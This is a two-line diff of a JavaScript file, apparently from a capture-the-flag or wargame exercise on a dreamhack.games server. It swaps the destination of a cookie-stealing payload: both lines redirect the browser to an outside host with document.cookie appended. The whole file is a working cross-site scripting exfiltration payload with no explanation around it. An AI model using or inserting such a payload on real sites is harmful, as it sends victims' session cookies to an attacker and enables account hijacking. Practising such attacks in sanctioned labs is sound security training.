@@ -1,2 +1,2 @@
-location.href="https://y0ungminhada.github.io/Homepage/" + document.cookie;
+location.href="https://kyhdnkr.request.dreamhack.games/" + document.cookie;
 
